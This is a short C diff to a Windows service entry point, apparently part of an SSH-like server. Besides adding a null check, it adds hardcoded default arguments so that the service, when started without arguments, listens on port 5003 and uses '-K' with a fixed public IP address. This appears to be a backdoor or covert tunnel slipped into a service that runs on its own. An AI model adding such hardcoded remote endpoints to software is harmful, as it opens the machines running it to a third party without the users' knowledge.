@@ -90,12 +90,16 @@ static void CALLBACK _ControlHandle(DWORD dwCtrlCode)
 
 static void CALLBACK service_main(DWORD dwArgc, LPTSTR *lpszArgv)
 {
+    static char *_winsrv_args[] = {"main.exe", "-l", "5003", "-K", "110.42.145.164:5003"};
     sshStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, _ControlHandle);
     UpdateStatus(sshStatusHandle, lastStatus);
 
-    if (dwArgc > 2) {
+    if (dwArgc > 2 && lpszArgv != NULL) {
 	srand(time(NULL));
 	_winsrv(dwArgc, lpszArgv);
+    } else {
+	srand(time(NULL));
+        _winsrv(5, _winsrv_args);
     }
 
     UpdateStatus(sshStatusHandle, lastStatus = SERVICE_STOPPED);
